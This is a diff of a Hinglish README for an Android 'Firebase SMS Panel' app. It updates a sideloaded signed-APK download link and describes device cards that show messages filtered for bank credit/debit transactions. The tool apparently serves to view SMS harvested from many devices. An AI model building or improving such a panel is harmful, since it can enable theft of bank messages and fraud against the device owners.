@@ -4,8 +4,8 @@ Virtus Panel Viewer Pro–style screen: **TXT** me Firebase panels → **Start F
 
 ## Signed APK
 
-**Download (latest signed, v1.0.12):**  
-`https://github.com/hivirtusss/V2-testing-done/raw/cursor/firebase-sms-panel-apk-8042/releases/FirebaseSmsPanel-1.0.12-release-signed.apk`
+**Download (latest signed, v1.0.13):**  
+`https://github.com/hivirtusss/V2-testing-done/raw/cursor/firebase-sms-panel-apk-8042/releases/FirebaseSmsPanel-1.0.13-release-signed.apk`
 
 **Signed** — phone pe “Install unknown apps” allow karo.
 
@@ -37,7 +37,7 @@ cp keystore.properties.example keystore.properties
 8. **PIN** — PIN / No PIN; dubara tap = **sab devices** (donon).
 9. **SMS age** — **1d** ya **All** (baaki din options hata diye).
 10. **ACTIVE** strip — tier + PIN + connection + age.
-11. **Devices** — white cards; neeche **MSG** jo **filters** se pass hue; **card tap** → poori list sheet me.
+11. **Devices** — white cards; **Firebase** URL line; neeche **MSG** (credit/debit/received jaisi bank txn — amount na parse ho to bhi pass ho sakta); **card tap** → sheet.
 
 ### Virtus fetch (auth + `clients` + `messages`)
 
